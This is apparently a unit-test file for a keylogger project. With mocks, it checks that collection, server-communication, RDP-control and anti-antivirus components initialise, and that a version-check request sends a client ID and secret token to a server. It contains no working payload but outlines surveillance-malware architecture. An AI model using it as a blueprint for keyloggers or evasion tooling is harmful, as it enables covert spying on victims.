import unittest
from unittest.mock import patch, MagicMock
from main import KeyloggerCore
from config import Config

class TestKeyloggerCore(unittest.TestCase):
    def setUp(self):
        # Set test mode to avoid dangerous operations
        Config.TEST_MODE = True
        Config.DEBUG_MODE = True
        self.keylogger = KeyloggerCore()

    @patch('main.SystemCollector')
    @patch('main.ServerCommunicator')
    @patch('main.ActivityLogger')
    @patch('main.RDPController')
    @patch('main.AntiAV')
    def test_initialization(self, mock_anti_av, mock_rdp, mock_logger, mock_communicator, mock_collector):
        self.assertEqual(self.keylogger.client_id, Config.get_client_id())
        self.assertTrue(mock_communicator.called)
        self.assertTrue(mock_logger.called)
        self.assertTrue(mock_rdp.called)
        self.assertTrue(mock_anti_av.called)

    @patch('main.ServerCommunicator')
    def test_check_for_updates(self, mock_communicator):
        mock_communicator.return_value._send_request.return_value = [{"current_version": "2.0", "download_url": "http://example.com"}]
        with patch('main.version.parse', side_effect=lambda x: x):
            self.keylogger.check_for_updates()
            mock_communicator.return_value._send_request.assert_called_with(
                "action=check_version",
                data={"client_id": self.keylogger.client_id, "token": Config.SECRET_TOKEN}
            )

    def tearDown(self):
        Config.TEST_MODE = False
        Config.DEBUG_MODE = False

if __name__ == '__main__':
    unittest.main()